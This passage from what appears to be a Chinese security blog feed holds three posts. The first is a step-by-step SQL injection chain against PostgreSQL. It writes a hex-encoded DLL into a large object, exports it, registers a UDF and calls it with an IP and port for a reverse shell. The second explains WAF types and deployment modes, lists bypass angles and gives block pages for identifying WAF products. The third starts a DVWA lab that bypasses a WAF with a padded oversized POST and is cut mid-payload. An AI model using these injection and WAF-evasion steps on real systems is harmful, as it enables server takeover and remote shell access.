<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> test(<span class="string">&#x27;192.168.123.42&#x27;</span>,<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>

<p>即可获取一个与 postgres 相同权限的 shell。</p>
<p>当然，这里只是本地进行测试的过程,而真正在注入点要比这繁琐一些：</p>
<p>首先需要查看是否为 super 权限：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> usesuper::text::<span class="type">int</span> <span class="keyword">from</span> pg_user <span class="keyword">where</span> usename<span class="operator">=</span><span class="built_in">current_user</span>;</span><br></pre></td></tr></table></figure>

<p>如果确认为 super 权限，同时可以通过联合查询返回结果则执行以下语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,lo_creat(<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>

<p>否则创建临时表保存返回的 oid：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tempAD4EA(id oid);<span class="keyword">insert</span> <span class="keyword">into</span> tempAD4EA <span class="keyword">values</span>(lo_creat(<span class="number">-1</span>));</span><br></pre></td></tr></table></figure>

<p>进行强制类型转换或盲注获取结果：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 强制类型转换报错</span><br><span class="line"><span class="keyword">select</span> (<span class="string">&#x27;&#x27;</span><span class="operator">||</span>(id::text))::<span class="type">int</span> <span class="keyword">from</span> tempAD4EA <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 盲注</span><br><span class="line">(省略服务端脚本中部分) <span class="keyword">and</span> (<span class="keyword">select</span> id <span class="keyword">from</span> tempAD4EA) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 基于延时的盲注</span><br><span class="line"><span class="keyword">select</span> pg_sleep(<span class="number">5</span>) <span class="keyword">where</span> (<span class="keyword">select</span> id <span class="keyword">from</span> tempAD4EA) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>记下返回的 OID，以供后续使用。</p>
<p>删除临时表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> tempAD4EA;</span><br></pre></td></tr></table></figure>

<p>查看数据库版本，选择正确的 UDF：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> version()::<span class="type">int</span>;</span><br></pre></td></tr></table></figure>

<p>根据 OID 打开之前的大对象，并向其中写入内容(语句中的 OID 为先前返回)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(OID,x<span class="string">&#x27;60000&#x27;</span>::<span class="type">int</span>);<span class="keyword">select</span> lo_write(<span class="number">0</span>,decode(<span class="string">&#x27;HEXCODE&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>其中 HEXCODE 部分为 UDF 经过十六进制编码之后所得，可以使用 winhex 进行此操作。由于一般情况下注入点都在 URL 处,建议每次从 udf 函数中截取 512 字节并转换为 hex 值。</p>
<p>继续向大对象中追加数据，直到 UDF 完全导入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(OID,x<span class="string">&#x27;60000&#x27;</span>::<span class="type">int</span>);<span class="keyword">select</span> lo_lseek(<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>);<span class="keyword">select</span> lo_write(<span class="number">0</span>,decode(<span class="string">&#x27;XXXXXXXXXXXX&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>将文件导出：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_export(OID,<span class="string">&#x27;1.dll&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>删除大对象：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_unlink(OID);;</span><br></pre></td></tr></table></figure>

<p>注册 UDF 函数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">or</span> replace <span class="keyword">function</span> test(text,<span class="type">int</span>) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">as</span> <span class="string">&#x27;1.dll&#x27;</span>,<span class="string">&#x27;GetResvShell&#x27;</span> <span class="keyword">language</span> c;</span><br></pre></td></tr></table></figure>

<p>获取反弹 Shell：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> test(<span class="string">&#x27;192.168.1.10&#x27;</span>,<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/11/tEv3xQnz4f29kVg.png" alt="QQ截图20211011230000"></p>
<p>至此对 postgres UDF函数利用已经结束了，得到一个与数据库进程相同权限的 Shell 已经是能够通过注入点获取到的最高权限了(在 linux 下为 postgres 用户权限，windows 下为 Network Services)。</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF-Bypass之WAF介绍与分析</title>
    <url>/post/e1e1fb64.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WAF的介绍"><a href="#WAF的介绍" class="headerlink" title="WAF的介绍"></a>WAF的介绍</h2><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
<p><img src="https://i.loli.net/2021/10/13/TE9WZhcpn1gP5je.png" alt="image-20211013192504092"></p>
<h2 id="WAF的工作原理"><a href="#WAF的工作原理" class="headerlink" title="WAF的工作原理"></a>WAF的工作原理</h2><p>WAF的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录。</p>
<h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP/HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p>
<h3 id="规则检测"><a href="#规则检测" class="headerlink" title="规则检测"></a>规则检测</h3><p>每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p>
<h3 id="处理模块"><a href="#处理模块" class="headerlink" title="处理模块"></a>处理模块</h3><p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。</p>
<h3 id="日志模块"><a href="#日志模块" class="headerlink" title="日志模块"></a>日志模块</h3><p>WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p>
<h3 id="WAF的防御思想"><a href="#WAF的防御思想" class="headerlink" title="WAF的防御思想"></a>WAF的防御思想</h3><p><strong>攻击的特点</strong>：</p>
<ul>
<li>攻击二象性：已知攻击与未知攻击</li>
<li>攻击的两个维度：形式与漏洞</li>
</ul>
<p><strong>核心原理</strong>：</p>
<ul>
<li>运用‘黑’、‘白’思想</li>
<li>特征匹配、漏洞签名</li>
<li>对匹配结果进行响应(拦截、记录)</li>
</ul>
<h2 id="WAF的分类"><a href="#WAF的分类" class="headerlink" title="WAF的分类"></a>WAF的分类</h2><h3 id="云WAF"><a href="#云WAF" class="headerlink" title="云WAF"></a>云WAF</h3><p><strong>优点</strong>：</p>
<ul>
<li>快速部署、零维护、低成本：无需安装任何软件或者部署任何硬件设备，只需修改DNS即可将网站部署到云WAF的防护范围之内。对中小型企业的网络管理员和个人站长有很大吸引力。</li>
<li>用户无需更新：云WAF的防护规则都处于云端，新漏洞爆发时，由云端负责规则的更新和维护，用户无需担心因为疏忽导致受到新型的漏洞攻击。</li>
<li>可充当CDN：云WAF在提供防护功能的同时，还同时具有CDN的功能，在进行防护的同时还可以提高网站访问的速率，CDN通过跨运营商的多线智能解析调度将静态资源动态负载到全国的云节点，用户访问某个资源时会被引导至最近的云端节点从而提高访问速度。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>存在轻易被绕过的风险：云WAF的主要实现原理是通过将用户的DNS解析到云节点实现防护，这样一来，如果黑客通过相关手段获取了服务器的真实IP地址，然后强制解析域名，就可以轻松绕过云WAF对服务器发起攻击。</li>
<li>可靠性低：云WAF处理一次请求，其中需要经过DNS解析、请求调度、流量过滤等环节，其中涉及协同关联工作，其中只要有一个环节出现问题，就会导致网站无法访问。必要时，只能手动切换为原DNS来保证业务正常运行，而域名解析需要一定时间，则会导致网站短时间无法正常访问。</li>
<li>保密性低：网站访问数据对于一些企业、机构来说为保密数据，里面可能包含用户的隐私或者商业信息，这些数据自行管控会相对安全，但是如果使用WAF，所有的数据会记录到云端，这相当于数据被别人保管，可能存在一定的泄露风险。</li>
</ul>
<p><strong>主流产品</strong>：阿里云盾、cloudflare、百度云加速、腾讯云安全、深信服云WAF、创宇盾、加速乐、安全宝</p>
<h3 id="软件WAF"><a href="#软件WAF" class="headerlink" title="软件WAF"></a>软件WAF</h3><p><strong>优点</strong>：</p>
<ul>
<li>安装简单、使用方便、成本低：采用纯软件的方式实现</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>安全性和可靠性低：软件WAF必须安装Web应用服务器上，所以，除了性能受到限制，还可能存在兼容性、安全性不足及升级成本较高等问题。</li>
</ul>
<p><strong>主流产品</strong>：网站安全狗、云锁、D盾、宝塔面板、ModSecurity、Naxsi、360网站卫士、360webscan</p>
<h3 id="硬件WAF"><a href="#硬件WAF" class="headerlink" title="硬件WAF"></a>硬件WAF</h3><p><strong>优点</strong>：</p>
<ul>
<li>可承受较高的吞吐量。</li>
<li>性能好、功能全、支持多种部署方式</li>
<li>即插即用：由于硬件防部署简易，硬件WAF只需串联到网络中，进行简单的配置后即可实现Web安全防护。</li>
<li>防护范围大：由于硬件防火墙直接串联到了交换机，所以在同一个交换机下的所有服务器，都处于防火墙的防护范围之类。</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>价格昂贵，动辄几十万。</li>
<li>存在一定误杀：由于硬件WAF是通过攻击规则库对异常流量进行识别，所以在业务系统复杂的情况下，可能存在一定误杀导致正常功能被防火墙拦截导致影响正常业务。</li>
<li>存在一定绕过机率：硬件防火墙对HTTP协议进行自行解析，可能存在与Web服务器对HTTP请求的理解不一致从而导致被绕过。</li>
</ul>
<p><strong>主流厂商</strong>：启明星辰、安恒、绿盟、天融信、飞塔</p>
<h3 id="自定义WAF"><a href="#自定义WAF" class="headerlink" title="自定义WAF"></a>自定义WAF</h3><p>我们在平时的渗透测试中，更多情况下会遇到的是网站开发人员自己写的防护规则。网站开发人员为了网站的安全，会在可能遭受攻击的地方增加一些安全防护代码，比如过滤敏感字符，对潜在的威胁的字符进行编码、转义等。</p>
<h2 id="WAF的部署模式"><a href="#WAF的部署模式" class="headerlink" title="WAF的部署模式"></a>WAF的部署模式</h2><h3 id="基于DNS解析的云WAF"><a href="#基于DNS解析的云WAF" class="headerlink" title="基于DNS解析的云WAF"></a>基于DNS解析的云WAF</h3><p>修改DNS，让域名解析到反向代理服务器。所有流量经过反向代理进行检测，检测无问题之后再转发给后端的Web服务器。</p>
<p><img src="https://i.loli.net/2021/10/13/BO6zTMUWfyswQXY.png" alt="image-20211013200415493"></p>
<h3 id="串联模式"><a href="#串联模式" class="headerlink" title="串联模式"></a>串联模式</h3><p>硬件防护设备串在网络链路中，所有的流量经过核心交换机引流到防护设备中，在防护设备中对请求进行检测，合法的请求会把流量发送给Web服务器。当发现攻击行为时，会阻断该请求，后端Web服务器无感知到任何请求。</p>
<h4 id="反向代理模式"><a href="#反向代理模式" class="headerlink" title="反向代理模式"></a>反向代理模式</h4><p>WAF作为反向代理服务器向后端服务器转发收到的HTTP请求，在转发的同时会对经过的HTTP请求做攻击检测。</p>
<p>但该模式会改变现有网络结构，用户真实IP会以HTTP Header传递给后端web服务器，需要提前配置好域名与目的服务器的转发规则，在站点和后端Web服务器较多的情况下，转发规则等配置较复杂。</p>
<p><img src="https://i.loli.net/2021/10/13/aDk4bswpCzfmvYH.png" alt="image-20211013204206923"></p>
<h4 id="透明代理模式"><a href="#透明代理模式" class="headerlink" title="透明代理模式"></a>透明代理模式</h4><p>WAF将客户端与web服务器之间TCP连接监控下来。在用户无感知的情况下代理了WEB客户端和服务器之间的会话，并基于桥模式进行转发。从WEB客户端的角度看，WEB客户端仍然是直接访问服务器。</p>
<p>从WAF工作转发原理看和透明网桥转发一样，因而称之为透明代理模式。该方式的特点是：对网络的改动最小，可以实现零配置部署。</p>
<p><img src="https://i.loli.net/2021/10/13/WE5du69PhSpbcOV.png" alt="image-20211013204502126"></p>
<h3 id="旁路模式"><a href="#旁路模式" class="headerlink" title="旁路模式"></a>旁路模式</h3><p>利用交换机的端口镜像功能，将业务流量转发一份给WAF，WAF只对业务流量进行监控和报警，不进行拦截阻断。对于WAF而言，流量只进不出。</p>
<p>该模式的特点是：在WAF出故障的情况下，不影响业务连续性。但是需要联动其他设备(如出口防火墙)来下发阻断策略。</p>
<p><img src="https://i.loli.net/2021/10/13/jUYgnTHedQFhISW.png" alt="image-20211013204644602"></p>
<h3 id="软件嵌入中间件-检测引擎模式"><a href="#软件嵌入中间件-检测引擎模式" class="headerlink" title="软件嵌入中间件 + 检测引擎模式"></a>软件嵌入中间件 + 检测引擎模式</h3><p>在使用 Nginx 作为反向代理的业务下，WAF 提供 Nginx 模块嵌入原有 Nginx，将请求转发给检测引擎，可以做到在不改动原有网络拓扑的情况下完成检测任务。</p>
<p><img src="https://i.loli.net/2021/10/13/GZwQ5FTdUfJ1a8S.png" alt="image-20211013204950399"></p>
<h2 id="WAF绕过的实现"><a href="#WAF绕过的实现" class="headerlink" title="WAF绕过的实现"></a>WAF绕过的实现</h2><h3 id="WAF为什么会被绕过？"><a href="#WAF为什么会被绕过？" class="headerlink" title="WAF为什么会被绕过？"></a>WAF为什么会被绕过？</h3><ul>
<li>鱼（安全）与 熊掌（业务性能）不可兼得</li>
<li>WAF为了考虑通用性的问题，无法100%覆盖某些语言、中间件、数据库的特性；</li>
<li>硬件WAF自身往往存在漏洞</li>
</ul>
<h3 id="WAF绕过的角度"><a href="#WAF绕过的角度" class="headerlink" title="WAF绕过的角度"></a>WAF绕过的角度</h3><ul>
<li><strong>架构</strong> ————–（如通过DNS解析等寻找真实IP来绕过云WAF）</li>
<li><strong>规则缺陷</strong>/<strong>特性</strong> ————–（如利用正则匹配缺陷、数据库特性、中间件特性等绕过WAF）</li>
<li><strong>协议</strong> ————–（如针对HTTP_0.9版本下TCP长链接情况下的绕过）</li>
</ul>
<p>之后的WAF Bypass也会从这几个角度分析，绕过各种WAF。</p>
<h2 id="不同WAF拦截告警页面"><a href="#不同WAF拦截告警页面" class="headerlink" title="不同WAF拦截告警页面"></a>不同WAF拦截告警页面</h2><p>不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。</p>
<h3 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h3><p><strong>旧版</strong>：</p>
<p><img src="https://i.loli.net/2021/10/13/nB3T4CL26jVOhK5.png" alt="image-20211013231932526"></p>
<p><strong>新版</strong>：</p>
<p><img src="https://i.loli.net/2021/10/13/B4oj93meSkDN7X6.png" alt="image-20211013231857602"></p>
<h3 id="D盾"><a href="#D盾" class="headerlink" title="D盾"></a>D盾</h3><p><img src="https://i.loli.net/2021/10/13/BTeAwgRkQXl5jmP.png" alt="image-20211013232137219"></p>
<h3 id="西数WTS-WAF"><a href="#西数WTS-WAF" class="headerlink" title="西数WTS-WAF"></a>西数WTS-WAF</h3><p><img src="https://i.loli.net/2021/10/13/TbSFjlM3GkJvnVI.png" alt="img"></p>
<h3 id="云锁"><a href="#云锁" class="headerlink" title="云锁"></a>云锁</h3><p><img src="https://i.loli.net/2021/10/13/X7uHVW8Snf1qIUc.png" alt="img"></p>
<h3 id="宝塔网站防火墙"><a href="#宝塔网站防火墙" class="headerlink" title="宝塔网站防火墙"></a>宝塔网站防火墙</h3><p><img src="https://i.loli.net/2021/10/13/a7vXxRNwoDWQzZf.png" alt="image-20211013232423393"></p>
<h3 id="安全宝"><a href="#安全宝" class="headerlink" title="安全宝"></a>安全宝</h3><p><img src="https://i.loli.net/2021/10/13/dhE1mGx2zf7eZlX.png" alt="image-20211013234028253"></p>
<h3 id="护卫神"><a href="#护卫神" class="headerlink" title="护卫神"></a>护卫神</h3><p><img src="https://i.loli.net/2021/10/13/P4ogsQFXAWcI3wh.png" alt="img"></p>
<h3 id="UPUPW"><a href="#UPUPW" class="headerlink" title="UPUPW"></a>UPUPW</h3><p><img src="https://i.loli.net/2021/10/13/AW7bz8kLPMomS1I.png" alt="img"></p>
<h3 id="阿里云盾"><a href="#阿里云盾" class="headerlink" title="阿里云盾"></a>阿里云盾</h3><p><img src="https://i.loli.net/2021/10/13/pADYIxnVw2hERme.png" alt="img"></p>
<h3 id="CloudFlare"><a href="#CloudFlare" class="headerlink" title="CloudFlare"></a>CloudFlare</h3><p><img src="https://i.loli.net/2021/10/13/SzwFKj6QlUdqsnT.png" alt="image-20211013232237378"></p>
<h3 id="创宇盾"><a href="#创宇盾" class="headerlink" title="创宇盾"></a>创宇盾</h3><p><img src="https://i.loli.net/2021/10/13/GCysZ7FEHo8P5Ya.png" alt="img"></p>
<h3 id="玄武盾"><a href="#玄武盾" class="headerlink" title="玄武盾"></a>玄武盾</h3><p><img src="https://i.loli.net/2021/10/13/4YsNCluj6cRzvbL.png" alt="image-20211013233123284"></p>
<h3 id="蓝盾"><a href="#蓝盾" class="headerlink" title="蓝盾"></a>蓝盾</h3><p><img src="https://i.loli.net/2021/10/13/2GEfa8wDTlienRP.png" alt="image-20211013234111708"></p>
<h3 id="DuEdge百度边缘网络计算"><a href="#DuEdge百度边缘网络计算" class="headerlink" title="DuEdge百度边缘网络计算"></a>DuEdge百度边缘网络计算</h3><p><img src="https://i.loli.net/2021/10/13/eAVETpOaRbzQgqY.png" alt="image-20211013233354082"></p>
<h3 id="腾讯云"><a href="#腾讯云" class="headerlink" title="腾讯云"></a>腾讯云</h3><p><img src="https://i.loli.net/2021/10/13/xiJtU4V32BmWzXY.png" alt="img"></p>
<h3 id="百度云"><a href="#百度云" class="headerlink" title="百度云"></a>百度云</h3><p><img src="https://i.loli.net/2021/10/13/5UlW3hSm9OjbIYM.png" alt="img"></p>
<h3 id="华为云"><a href="#华为云" class="headerlink" title="华为云"></a>华为云</h3><p><img src="https://i.loli.net/2021/10/13/oFm8vNZaPTt1jOb.png" alt="img"></p>
<h3 id="360webscan"><a href="#360webscan" class="headerlink" title="360webscan"></a>360webscan</h3><p><img src="https://i.loli.net/2021/10/13/PaAlbG5K86RQzq1.png" alt="img"></p>
<h3 id="360安域"><a href="#360安域" class="headerlink" title="360安域"></a>360安域</h3><p><img src="https://i.loli.net/2021/10/13/cDw6SLsRe3QBAb1.png" alt="image-20211013234002168"></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>WAF-Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF-Bypass之SQL注入绕过安全狗</title>
    <url>/post/6c2dcc62.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h2><p>靶场：DVWA（low级别）</p>
<p>数据库：MySQL 5.5</p>
<p>Web脚本：PHP 5.4.19</p>
<p>WAF：网站安全狗（Apache版）v4.0.2313</p>
<p><img src="https://i.loli.net/2021/10/14/O1zMRZh2BSXbfr8.png" alt="image-20211014211210255"></p>
<p>让我们查看一下DVWA-LOW级别SQL注入的源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到这里是采用$_REQUEST的方式进行表单数据的传递。这就说明既可以使用GET方式传参，也可以使用POST方式进行传参。</p>
<h2 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h2><p><strong>绕过技巧</strong>：</p>
<ul>
<li>GET型请求转POST型</li>
<li>Content-Length头长度大于8200</li>
<li>正常参数在脏数据后面，否则无效</li>
</ul>
<p><strong>数据包构造</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8200</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line"></span><br><span class="line">a=/*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCCCCCCCDDDDDBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCSSSSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAA